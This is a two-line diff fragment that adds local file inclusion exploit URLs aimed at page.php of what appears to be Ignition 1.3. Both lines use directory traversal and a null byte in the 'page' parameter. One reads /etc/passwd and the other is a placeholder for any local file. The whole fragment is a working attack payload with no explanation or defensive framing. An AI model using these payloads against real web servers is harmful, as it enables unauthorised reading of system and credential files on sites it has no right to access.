@@ -1,0 +1,2 @@
+http://www.example.com/[ignition1.3]/page.php?page=../../../../../etc/passwd%00
+http://www.example.com/[ignition1.3]/page.php?page=../../../../../[localfile]%00
